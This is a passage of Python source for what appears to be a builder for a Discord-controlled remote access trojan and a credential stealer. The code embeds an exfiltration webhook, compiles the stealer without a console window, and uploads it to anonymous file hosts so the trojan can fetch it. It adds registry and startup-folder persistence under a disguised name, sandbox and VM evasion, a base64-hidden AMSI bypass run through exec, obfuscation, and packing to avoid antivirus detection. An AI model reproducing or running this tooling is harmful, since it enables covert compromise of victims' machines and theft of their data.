                print(f"{Fore.RED}[!] UPX packing failed: {result.stderr.decode()}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[!] Continuing without packing...{Style.RESET_ALL}")
                
        elif packer == "mpress":
            mpress_path = "mpress"
            if os.path.exists("mpress.exe"):
                mpress_path = os.path.abspath("mpress.exe")
            
            print(f"{Fore.CYAN}[*] Running MPRESS packer: {mpress_path} -s {exe_path}{Style.RESET_ALL}")
            result = subprocess.run([mpress_path, "-s", exe_path], 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE,
                                   check=False)
            
            if result.returncode == 0:
                print(f"{Fore.GREEN}[+] Executable packed successfully with MPRESS!{Style.RESET_ALL}")
            else:
                try:
                    result = subprocess.run([mpress_path, exe_path], 
                                          stdout=subprocess.PIPE, 
                                          stderr=subprocess.PIPE,
                                          check=False)
                    if result.returncode == 0:
                        print(f"{Fore.GREEN}[+] Executable packed successfully with MPRESS!{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[!] MPRESS packing failed: {result.stderr.decode()}{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[!] Continuing without packing...{Style.RESET_ALL}")
                except Exception as inner_e:
                    print(f"{Fore.RED}[!] MPRESS packing failed: {str(inner_e)}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[!] Continuing without packing...{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Failed to pack executable: {str(e)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Continuing without packing...{Style.RESET_ALL}")
def insert_webhook(webhook):
    """Insert the webhook URL into the stealer source code."""
    if not webhook:
        print(f"{Fore.YELLOW}[*] No webhook provided, using default webhook.{Style.RESET_ALL}")
        return True
        
    try:
        content = safe_read_file("stealer_source.py")
        if not content:
            print(f"{Fore.RED}[!] Could not read stealer_source.py{Style.RESET_ALL}")
            return False
        
        # Find the appropriate line to insert the webhook
        webhook_pattern = re.compile(r'wbhk\s*=\s*[\'"].*?[\'"]')
        
        if webhook_pattern.search(content):
            # Replace existing webhook and add newline
            modified_content = webhook_pattern.sub(f"\nwbhk = '{webhook}'", content)
            print(f"{Fore.GREEN}[+] Webhook replaced in existing location with newline!{Style.RESET_ALL}")
        else:
            # Try to find a good location to insert
            lines = content.splitlines()
            insert_position = min(36, len(lines)) if len(lines) > 0 else 0
            
            if insert_position > 0:
                lines.insert(insert_position, "")  # Add blank line
                lines.insert(insert_position + 1, f"wbhk = '{webhook}'")
                modified_content = '\n'.join(lines)
                print(f"{Fore.GREEN}[+] Webhook inserted at line {insert_position} with newline!{Style.RESET_ALL}")
            else:
                # If file is too short, append to the end with newline
                modified_content = content + f"\n\nwbhk = '{webhook}'\n"
                print(f"{Fore.GREEN}[+] Webhook appended to the end of the file with newline!{Style.RESET_ALL}")
        return safe_write_file("stealer_source.py", modified_content)
    except Exception as e:
        print(f"{Fore.RED}[!] Error inserting webhook: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()
        return False

def upload_to_0x0(file_path):
    """Upload a file to 0x0.st and return the URL."""
    print(f"{Fore.CYAN}[*] Uploading {file_path} to 0x0.st...{Style.RESET_ALL}")
    
    # Try using curl if available
    if check_curl():
        try:
            result = subprocess.run(
                ["curl", "-F", f"file=@{file_path}", "https://0x0.st"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=False
            )
            if result.returncode == 0 and result.stdout.strip().startswith("https://"):
                return result.stdout.strip()
            print(f"{Fore.YELLOW}[!] curl failed, falling back to Python requests.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error using curl: {str(e)}, falling back to Python requests.{Style.RESET_ALL}")
    
    # Fallback to Python requests
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            response = requests.post('https://0x0.st', files=files)
        
        if response.status_code == 200:
            return response.text.strip()
        else:
            print(f"{Fore.RED}[!] Failed to upload file. Status code: {response.status_code}{Style.RESET_ALL}")
            return None
    except Exception as e:
        print(f"{Fore.RED}[!] Error uploading file: {str(e)}{Style.RESET_ALL}")
        return None

def compile_stealer(output_name):
    """Compile the stealer source code into an executable and upload to 0x0.st."""
    try:
        print(f"{Fore.CYAN}[*] Compiling stealer...{Style.RESET_ALL}")
        
        # Check if stealer_source.py exists
        if not os.path.exists("stealer_source.py"):
            print(f"{Fore.RED}[!] stealer_source.py not found. Cannot compile.{Style.RESET_ALL}")
            return None
        
        # Add random data to the executable to change hash
        with open("random_data_stealer.txt", "w", encoding="utf-8") as f:
            random_chars = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') 
                          for _ in range(random.randint(1000, 10000)))
            f.write(random_chars)
        
        stealer_output = f"{output_name}_stealer"
        
        # PyInstaller command with anti-detection options
        cmd = [
            "pyinstaller",
            "--onefile", 
            "--noconsole",
            "--clean",
            "--add-data", f"random_data_stealer.txt{os.pathsep}.",
            "--name", stealer_output,
            "--timeout", "60",  # Add timeout to prevent hanging
            "stealer_source.py"
        ]
        
        # Run PyInstaller or Nuitka based on availability
        try:
            # Try Nuitka first
            nuitka_cmd = [
                "python", "-m", "nuitka",
                "--mingw64",
                "--windows-disable-console",
                "--onefile",
                "--remove-output",
                "--assume-yes-for-downloads",
                "--output-dir=dist",
                "--timeout=60",  # Add timeout
                "stealer_source.py"
            ]
            
            process = subprocess.run(nuitka_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=300, check=False)
            
            if process.returncode == 0:
                print(f"{Fore.GREEN}[+] Successfully compiled with Nuitka{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] Nuitka compilation failed, falling back to PyInstaller{Style.RESET_ALL}")
                process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=300, check=False)
                
                if process.returncode != 0:
                    print(f"{Fore.RED}[!] Stealer compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
                    return None

        except subprocess.TimeoutExpired:
            print(f"{Fore.RED}[!] Compilation timed out after 5 minutes{Style.RESET_ALL}")
            return None
        except Exception:
            print(f"{Fore.YELLOW}[!] Nuitka not found, using PyInstaller{Style.RESET_ALL}")
            try:
                process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=300, check=False)
                
                if process.returncode != 0:
                    print(f"{Fore.RED}[!] Stealer compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
                    return None
            except subprocess.TimeoutExpired:
                print(f"{Fore.RED}[!] PyInstaller compilation timed out after 5 minutes{Style.RESET_ALL}")
                return None

        # Check if the executable was created
        exe_path = os.path.join("dist", f"{stealer_output}.exe")
        nuitka_exe = os.path.join("dist", "stealer_source.exe")
        
        if os.path.exists(nuitka_exe):
            exe_path = nuitka_exe
            shutil.move(nuitka_exe, os.path.join("dist", f"{stealer_output}.exe"))
            
        if os.path.exists(exe_path):
            # Copy to current directory
            shutil.copy(exe_path, f"{stealer_output}.exe")
            print(f"{Fore.GREEN}[+] Stealer compiled successfully! Output: {stealer_output}.exe{Style.RESET_ALL}")
            
            # Upload to multiple file hosts
            url = None
            hosts = [
                'https://0x0.st',
                'https://transfer.sh',
                'https://file.io',
                'https://gofile.io/uploadFile',
                'https://catbox.moe/user/api.php',
                'https://tmpfiles.org/api/v1/upload',
                'https://api.anonfiles.com/upload'
            ]
            
            for host in hosts:
                try:
                    with open(f"{stealer_output}.exe", 'rb') as f:
                        if host == 'https://transfer.sh':
                            response = requests.put(f'{host}/{stealer_output}.exe', data=f)
                        elif host == 'https://catbox.moe/user/api.php':
                            response = requests.post(host, files={'fileToUpload': f})
                        elif host == 'https://gofile.io/uploadFile':
                            response = requests.post(host, files={'file': f})
                            if response.status_code == 200:
                                data = response.json()
                                if data.get('status') == 'ok':
                                    url = f"https://gofile.io/d/{data['data']['code']}"
                                    break
                            continue
                        else:
                            response = requests.post(host, files={'file': f})
                            
                    if response.status_code == 200:
                        url = response.text.strip()
                        if url:
                            print(f"{Fore.GREEN}[+] Stealer uploaded to: {url}{Style.RESET_ALL}")
                            break
                except:
                    continue
            
            if url:
                return url
            else:
                print(f"{Fore.RED}[!] Failed to upload stealer to any file host{Style.RESET_ALL}")
                return None
                
        print(f"{Fore.RED}[!] Stealer compilation completed but executable not found.{Style.RESET_ALL}")
        return None
            
    except Exception as e:
        print(f"{Fore.RED}[!] Error compiling stealer: {str(e)}{Style.RESET_ALL}")
        return None
    finally:
        # Clean up
        try:
            shutil.rmtree("build", ignore_errors=True)
            shutil.rmtree("dist", ignore_errors=True)
            shutil.rmtree("stealer_source.build", ignore_errors=True)
            if os.path.exists(f"{stealer_output}.spec"):
                os.remove(f"{stealer_output}.spec")
            if os.path.exists("random_data_stealer.txt"):
                os.remove("random_data_stealer.txt")
            if os.path.exists("stealer_source.py"):
                os.remove("stealer_source.py")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Warning: Could not clean up some stealer files: {str(e)}{Style.RESET_ALL}")

def insert_stealer_link(link):
    """Insert the stealer link into the RAT source code."""
    if not link:
        print(f"{Fore.YELLOW}[!] No stealer link provided.{Style.RESET_ALL}")
        return False
        
    try:
        content = safe_read_file("rat_source.py")
        if not content:
            print(f"{Fore.RED}[!] Could not read rat_source.py{Style.RESET_ALL}")
            return False
            
        # Sanitize link
        link = link.strip().replace("'", "").replace('"', "")
        
        # Try to find existing link variable
        link_pattern = re.compile(r'link\s*=\s*[\'"].*?[\'"]')
        pkq_pattern = re.compile(r'pkq\s*=\s*[\'"].*?[\'"]')
        
        if link_pattern.search(content):
            # Replace existing link
            modified_content = link_pattern.sub(f"link = '{link}'", content)
            if pkq_pattern.search(modified_content):
                modified_content = pkq_pattern.sub(f"pkq = '{link}'", modified_content)
            else:
                modified_content = modified_content.replace(f"link = '{link}'", f"link = '{link}'\npkq = '{link}'")
            print(f"{Fore.GREEN}[+] Stealer link replaced in existing location!{Style.RESET_ALL}")
        else:
            # Look for a good place to insert the link
            # Try to insert it near the top of the file for better visibility
            lines = content.splitlines()
            # Look for a good position after imports but before code
            good_positions = []
            
            for i, line in enumerate(lines):
                if line.strip().startswith("appdata = "):
                    good_positions.append(i)
                elif line.strip().startswith("client = "):
                    good_positions.append(i)
            
            if good_positions:
                insert_position = max(good_positions) + 1
                lines.insert(insert_position, f"link = '{link}'")
                lines.insert(insert_position + 1, f"pkq = '{link}'")
                modified_content = '\n'.join(lines)
                print(f"{Fore.GREEN}[+] Stealer link inserted at line {insert_position}!{Style.RESET_ALL}")
            else:
                # Last resort, insert near the top
                if len(lines) > 21:
                    lines.insert(21, f"link = '{link}'")
                    lines.insert(22, f"pkq = '{link}'")
                    modified_content = '\n'.join(lines)
                    print(f"{Fore.GREEN}[+] Stealer link inserted at line 21!{Style.RESET_ALL}")
                else:
                    # If file is too short, append to the end
                    modified_content = content + f"\nlink = '{link}'\npkq = '{link}'\n"
                    print(f"{Fore.GREEN}[+] Stealer link appended to the end of the file!{Style.RESET_ALL}")
            
        return safe_write_file("rat_source.py", modified_content)
    except Exception as e:
        print(f"{Fore.RED}[!] Error inserting stealer link: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()
        return False

def insert_startup_code(enable_startup=False):
    """Insert registry startup code into the RAT source code."""
    try:
        content = safe_read_file("rat_source.py")
        if not content:
            print(f"{Fore.RED}[!] Could not read rat_source.py{Style.RESET_ALL}")
            return False
        
        # Check if startup function already exists
        if "def add_to_startup" in content:
            print(f"{Fore.GREEN}[+] Startup function already exists in code.{Style.RESET_ALL}")
            
            # If enable_startup is True, make sure the function is called
            if enable_startup and "add_to_startup()" not in content:
                # Find a good place to call the function (near the beginning of execution)
                lines = content.splitlines()
                inserted = False
                
                for i, line in enumerate(lines):
                    if "client = discord.Client" in line:
                        lines.insert(i + 1, "add_to_startup()")
                        inserted = True
                        break
                
                if inserted:
                    modified_content = '\n'.join(lines)
                    if safe_write_file("rat_source.py", modified_content):
                        print(f"{Fore.GREEN}[+] Added call to startup function{Style.RESET_ALL}")
                        return True
                else:
                    print(f"{Fore.YELLOW}[!] Could not find a suitable location to add startup call{Style.RESET_ALL}")
                    return False
            return True
        
        # Find a good place to insert the startup code (right after imports)
        lines = content.splitlines()
        insert_index = -1
        
        for i, line in enumerate(lines):
            if line.strip().startswith("appdata = "):
                insert_index = i
                break
        
        if insert_index == -1:
            print(f"{Fore.YELLOW}[!] Could not find a suitable location to insert startup function{Style.RESET_ALL}")
            return False
            
        # Create startup function code
        startup_code = """
def add_to_startup():
    try:
        key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        key_name = "SystemSecurityManager"
        exe_path = os.path.abspath(sys.argv[0])
        
        try:
            # Try HKCU first (no admin required)
            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(reg_key)
            return True
        except:
            # If that fails, try HKLM (requires admin)
            try:
                reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(reg_key)
                return True
            except:
                pass
                
        # WMI Persistence (fallback method)
        try:
            import wmi
            startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            shortcut_path = os.path.join(startup_folder, "SystemHelper.lnk")
            
            wmi_obj = wmi.WMI()
            startup_command = f'cmd.exe /c copy "{exe_path}" "{shortcut_path}"'
            wmi_process = wmi_obj.Win32_Process.Create(CommandLine=startup_command)
            return wmi_process[1] == 0
        except:
            pass
        
        return False
    except:
        return False

"""
        # Insert startup function
        lines.insert(insert_index + 1, startup_code)
        
        # Add call to startup function if enabled
        if enable_startup:
            # Find a good place to call the function (near the beginning of execution)
            for i, line in enumerate(lines):
                if "client = discord.Client" in line:
                    lines.insert(i + 1, "add_to_startup()")
                    break
        
        modified_content = '\n'.join(lines)
        if safe_write_file("rat_source.py", modified_content):
            print(f"{Fore.GREEN}[+] Startup persistence code {'enabled' if enable_startup else 'added but not activated'}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[!] Failed to write startup code to file{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error adding startup function: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()
        return False

def improve_stealth():
    """Add anti-detection techniques to the RAT source code."""
    try:
        with open("rat_source.py", "r", encoding="utf-8") as f:
            lines = f.readlines()
        
        # Find a good place to insert the anti-detection code (after imports)
        insert_index = 0
        for i, line in enumerate(lines):
            if line.strip().startswith("appdata = "):
                insert_index = i
                break
        
        # Anti-detection code to insert
        anti_detect_code = """
def evade_detection():
    try:
        # Add delay to evade sandboxes
        time.sleep(random.randint(3, 6))
        
        # Check for virtualization/sandbox
        if check_vm():
            sys.exit(0)
            
        # Add random junk code to change signature
        junk = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(100, 200)))
        del junk
    except:
        pass

def check_vm():
    try:
        # Check common VM processes
        suspicious_processes = ["vboxservice.exe", "vmtoolsd.exe", "vboxtray.exe", "vmwaretray.exe"]
        output = subprocess.check_output("tasklist", shell=True).decode().lower()
        for proc in suspicious_processes:
            if proc in output:
                return True
                
        # Check for common VM registry keys
        vm_paths = [
            r"HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
            r"HARDWARE\\Description\\System"
        ]
        vm_strings = ["vmware", "vbox", "qemu", "xen"]
        
        for path in vm_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                value = winreg.QueryValueEx(key, "Identifier")[0]
                for vm_string in vm_strings:
                    if vm_string in value.lower():
                        return True
            except:
                pass
                
        return False
    except:
        return False

"""
        # Insert the anti-detection code
        lines.insert(insert_index + 1, anti_detect_code)
        
        # Add call to the anti-detection function
        for i, line in enumerate(lines):
            if "client = discord.Client" in line:
                lines.insert(i + 1, "evade_detection()\n")
                break
        
        with open("rat_source.py", "w", encoding="utf-8") as f:
            f.writelines(lines)
        
        print(f"{Fore.GREEN}[+] Anti-detection measures added{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error adding anti-detection code: {str(e)}{Style.RESET_ALL}")
        return False

def add_amsi_bypass():
    """Add AMSI bypass code to the RAT source code."""
    try:
        with open("rat_source.py", "r", encoding="utf-8") as f:
            lines = f.readlines()
        
        # Find a good place to insert the AMSI bypass code
        insert_index = 0
        for i, line in enumerate(lines):
            if line.strip().startswith("appdata = "):
                insert_index = i
                break
        
        # AMSI bypass function (encoded to avoid detection)
        amsi_bypass_code = """
def bypass_amsi():
    try:
        # Base64-encoded AMSI bypass to avoid detection while in source
        bypass_code = "aW1wb3J0IGN0eXBlcwppbXBvcnQgc3lzCgpkZWYgYnlwYXNzX2Ftc2koKToKICAgIHRyeToKICAgICAgICBpZiBzeXMucGxhdGZvcm0gIT0gJ3dpbjMyJzoKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIAogICAgICAgIGFtc2kgPSBjdHlwZXMud2luZGxsLmFtc2kKICAgICAgICBhZGRyZXNzID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5HZXRQcm9jQWRkcmVzcyhhbXNpLl9oYW5kbGUsICJBbXNpU2NhbkJ1ZmZlciIpCiAgICAgICAgCiAgICAgICAgaWYgbm90IGFkZHJlc3M6CiAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAKICAgICAgICBvbGRfcHJvdGVjdGlvbiA9IGN0eXBlcy5jX3Vsb25nKDApCiAgICAgICAgcGF0Y2hfYWRkcmVzcyA9IGN0eXBlcy5jX3ZvaWRfcChhZGRyZXNzKQogICAgICAgIHBhdGNoX3NpemUgPSA2CiAgICAgICAgCiAgICAgICAgcGF0Y2hfYnl0ZXMgPSBieXRlYXJyYXkoW0x4QjgsIDB4NTcsIDB4MDA6IDF4MDAsIE54MDA6IDB4ZSwgMHhjMyBdKQogICAgICAgICAgICAKICAgICAgICBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxQcm90ZWN0KHBhdGNoX2FkZHJlc3MsIHBhdGNoX3NpemUsIDB4NDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmJ5cmVmKG9sZF9wcm90ZWN0aW9uKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgIGN0eXBlcy5tZW1tb3ZlKHBhdGNoX2FkZHJlc3MsIGN0eXBlcy5jX3ZvaWRfcChwYXRjaF9ieXRlcyksIHBhdGNoX3NpemUpCiAgICAgICAgCiAgICAgICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsUHJvdGVjdChwYXRjaF9hZGRyZXNzLCBwYXRjaF9zaXplLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2xkX3Byb3RlY3Rpb24udmFsdWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdHlwZXMuYnlyZWYob2xkX3Byb3RlY3Rpb24pKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MK"
        exec(base64.b64decode(amsi_bypass_code).decode())
        bypass_amsi()
    except:
        pass

"""
        # Insert the AMSI bypass code
        lines.insert(insert_index + 1, amsi_bypass_code)
        
        # Add call to the AMSI bypass function
        for i, line in enumerate(lines):
            if "client = discord.Client" in line:
                lines.insert(i + 1, "bypass_amsi()\n")
                break
        
        with open("rat_source.py", "w", encoding="utf-8") as f:
            f.writelines(lines)
        
        print(f"{Fore.GREEN}[+] AMSI bypass added{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error adding AMSI bypass: {str(e)}{Style.RESET_ALL}")
        return False

def optimize_file_size(file_path):
    """Optimize the file size by removing comments and unnecessary code."""
    try:
        print(f"{Fore.CYAN}[*] Optimizing file size...{Style.RESET_ALL}")
        
        with open(file_path, "r", encoding="utf-8") as f:
            lines = f.readlines()
        
        # Filter out comments and keep only necessary code
        optimized_lines = []
        inside_multiline_comment = False
        junk_code_section = False
        
        for line in lines:
            # Skip empty lines and most comments
            stripped = line.strip()
            
            # Skip multiline comments
            if '"""' in stripped or "'''" in stripped:
                if inside_multiline_comment:
                    inside_multiline_comment = False
                    continue
                elif stripped.startswith('"""') or stripped.startswith("'''"):
                    inside_multiline_comment = True
                    continue
            
            if inside_multiline_comment:
                continue
                
            # Skip single line comments
            if stripped.startswith("#") and not stripped.startswith("#!/"):
                continue
                
            # Skip junk code sections
            if "_random_str = " in line or "_junk_data = " in line:
                junk_code_section = True
                continue
                
            if junk_code_section and "for _ in range" in line:
                continue
                
            if junk_code_section and "_random_str +=" in line:
                junk_code_section = False
                continue
            
            # Keep the line
            optimized_lines.append(line)
        
        # Write back the optimized file
        with open(file_path, "w", encoding="utf-8") as f:
            f.writelines(optimized_lines)
            
        print(f"{Fore.GREEN}[+] File size optimization completed successfully!{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error optimizing file size: {str(e)}{Style.RESET_ALL}")
        return False

def minimize_imports(file_path):
    """Remove unused and optimize imports in the source code to reduce final executable size."""
    try:
        print(f"{Fore.CYAN}[*] Optimizing imports to reduce binary size...{Style.RESET_ALL}")
        
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()
        
        # Common patterns for imports that increase binary size significantly
        heavy_imports = [
            (r'import cv2', 'try:\n    import cv2\nexcept ImportError:\n    pass'),
            (r'import pyautogui', 'try:\n    import pyautogui\nexcept ImportError:\n    pass'),
            (r'from PIL import ImageGrab', 'try:\n    from PIL import ImageGrab\nexcept ImportError:\n    pass'),
            (r'import win32com', 'try:\n    import win32com\nexcept ImportError:\n    pass'),
            (r'from win32com.client import Dispatch', 'try:\n    from win32com.client import Dispatch\nexcept ImportError:\n    pass'),
            (r'import browserhistory', 'try:\n    import browserhistory\nexcept ImportError:\n    pass'),
            (r'from cryptography.fernet import Fernet', 'try:\n    from cryptography.fernet import Fernet\nexcept ImportError:\n    pass')
        ]
        
        for pattern, replacement in heavy_imports:
            if pattern in content and f'try:\n    {pattern}' not in content:
                content = content.replace(pattern, replacement)
                print(f"{Fore.GREEN}[+] Optimized import: {pattern}{Style.RESET_ALL}")
        
        # Write the optimized content back
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(content)
            
        print(f"{Fore.GREEN}[+] Import optimization completed!{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error optimizing imports: {str(e)}{Style.RESET_ALL}")
        return False

def obfuscate_code(file_path):
    """Apply basic code obfuscation techniques to the source code."""
    try:
        print(f"{Fore.CYAN}[*] Applying code obfuscation...{Style.RESET_ALL}")
        
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()
            
        # Generate a random encryption key
        key = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(16))
        
        # Add string obfuscation function
        obfuscation_code = f"""
# String obfuscation helper
def _o(s, k='{key}'):
    r = ''
    for i, c in enumerate(s):
        r += chr(ord(c) ^ ord(k[i % len(k)]))
    return r

"""
        # Find function names and obfuscate them
        function_pattern = re.compile(r'def\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(')
        function_matches = function_pattern.findall(content)
        
        # Skip built-in and essential functions
        skip_functions = ['__init__', 'on_ready', 'on_message', 'run', 'start_keylogger', 'stop_keylogger']
        to_obfuscate = [f for f in function_matches if f not in skip_functions]
        
        # Create mapping of original function names to obfuscated names
        func_mapping = {}
        for func in to_obfuscate:
            # Create an obfuscated name with underscore prefix
            obfs_name = '_' + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
            func_mapping[func] = obfs_name
            
        # Obfuscate strings
        string_pattern = re.compile(r'(?<![\\\'"])(["\'])((?:\\\1|.)*?)\1')
        
        # Function to encode a string
        def xor_encode(match):
            quote = match.group(1)
            string = match.group(2)
            
            # Skip short strings, special strings and f-strings
            if len(string) <= 2 or string.startswith('f') or '{' in string or '\\' in string:
                return match.group(0)
                
            # Skip certain patterns we don't want to obfuscate
            skip_patterns = ['http', '\\', 'import', ':', '=', '.']
            for pattern in skip_patterns:
                if pattern in string:
                    return match.group(0)
            
            # Encode the string
            encoded = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(string))
            return f'_o({quote}{encoded}{quote})'
            
        # Apply only limited string obfuscation to avoid breaking the code
        limited_content = content
        count = 0
        for match in string_pattern.finditer(content):
            if count >= 10:  # Limit to just a few strings to be safe
                break
                
            if random.random() < 0.3:  # Only obfuscate some strings
                replacement = xor_encode(match)
                if replacement != match.group(0):
                    limited_content = limited_content.replace(match.group(0), replacement, 1)
                    count += 1
        
        # Apply function name obfuscation
        for original, obfuscated in func_mapping.items():
            pattern = re.compile(r'def\s+' + re.escape(original) + r'\s*\(')
            limited_content = pattern.sub(f'def {obfuscated}(', limited_content)
            
            # Replace function calls
            call_pattern = re.compile(r'(?<![a-zA-Z0-9_])' + re.escape(original) + r'(?=\s*\()')
            limited_content = call_pattern.sub(obfuscated, limited_content)
            
        # Add the obfuscation helper function
        result = obfuscation_code + limited_content
        
        # Add some junk code to change the file signature
        junk_code = '\n# ' + ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(100)) + '\n'
        result += junk_code
        
        # Write back the obfuscated code
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(result)
            
        print(f"{Fore.GREEN}[+] Code obfuscation applied successfully!{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error during code obfuscation: {str(e)}{Style.RESET_ALL}")
        traceback_str = traceback.format_exc()
        print(f"{Fore.RED}[!] Traceback: {traceback_str}{Style.RESET_ALL}")
        return False

def compile_rat(output_name, icon_path=None, packer=None):
    try:
        print(f"{Fore.CYAN}[*] Compiling RAT into executable...{Style.RESET_ALL}")
        
        if not os.path.exists("rat_source.py"):
            print(f"{Fore.RED}[!] rat_source.py not found. Cannot compile.{Style.RESET_ALL}")
            return False
        
        # Verify source file one more time
        try:
            with open("rat_source.py", "r", encoding="utf-8", errors="ignore") as f:
                # Check for possible compilation issues
                content = f.read()
                if "token = " not in content:
                    print(f"{Fore.RED}[!] Token variable not found in source file. Compilation will likely fail.{Style.RESET_ALL}")
                    return False
        except Exception as verify_error:
            print(f"{Fore.RED}[!] Error verifying source file: {str(verify_error)}{Style.RESET_ALL}")
            return False
            
        # Add random data to make the executable's hash unique
        print(f"{Fore.CYAN}[*] Generating random data to make executable unique...{Style.RESET_ALL}")
        with open("random_data.txt", "w", encoding="utf-8") as f:
            random_chars = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') 
                          for _ in range(random.randint(1000, 10000)))
            f.write(random_chars)
        
        # Prepare PyInstaller command
        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--add-data", f"random_data.txt{os.pathsep}.",
            "--name", output_name,
        ]
        
        if icon_path and os.path.exists(icon_path):
            print(f"{Fore.CYAN}[*] Using custom icon: {icon_path}{Style.RESET_ALL}")
            cmd.extend(["--icon", icon_path])
        else:
            print(f"{Fore.YELLOW}[!] No valid icon specified, using default icon.{Style.RESET_ALL}")
        
        cmd.append("rat_source.py")
        
        # Check if PyInstaller is installed
        try:
            subprocess.run(["pyinstaller", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        except FileNotFoundError:
            print(f"{Fore.YELLOW}[!] PyInstaller not found in PATH. Attempting to install it...{Style.RESET_ALL}")
            install_result = subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
            
            if install_result.returncode != 0:
                print(f"{Fore.RED}[!] Failed to install PyInstaller. Compilation cannot proceed.{Style.RESET_ALL}")
                print(f"{Fore.RED}[!] Error: {install_result.stderr.decode()}{Style.RESET_ALL}")
                return False
            else:
                print(f"{Fore.GREEN}[+] PyInstaller installed successfully!{Style.RESET_ALL}")
        
        # Run PyInstaller
        print(f"{Fore.CYAN}[*] Running PyInstaller... This may take a few minutes.{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Command: {' '.join(cmd)}{Style.RESET_ALL}")
        
        process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        
        if process.returncode != 0:
            print(f"{Fore.RED}[!] Compilation failed with error code {process.returncode}{Style.RESET_ALL}")
            
            # Print the last 10 lines of error output for better debugging
            error_lines = process.stderr.decode(errors='replace').splitlines()
            if error_lines:
                print(f"{Fore.RED}[!] Error details:{Style.RESET_ALL}")
                for line in error_lines[-10:]:
                    print(f"{Fore.RED}    {line}{Style.RESET_ALL}")
                
            # Try alternative compilation approach
            print(f"{Fore.YELLOW}[*] Trying alternative compilation method...{Style.RESET_ALL}")
            
            fallback_cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "rat_source.py",
                "-n", output_name
            ]
            
            if icon_path and os.path.exists(icon_path):
                fallback_cmd.extend(["--icon", icon_path])
                
            print(f"{Fore.CYAN}[*] Alternative command: {' '.join(fallback_cmd)}{Style.RESET_ALL}")
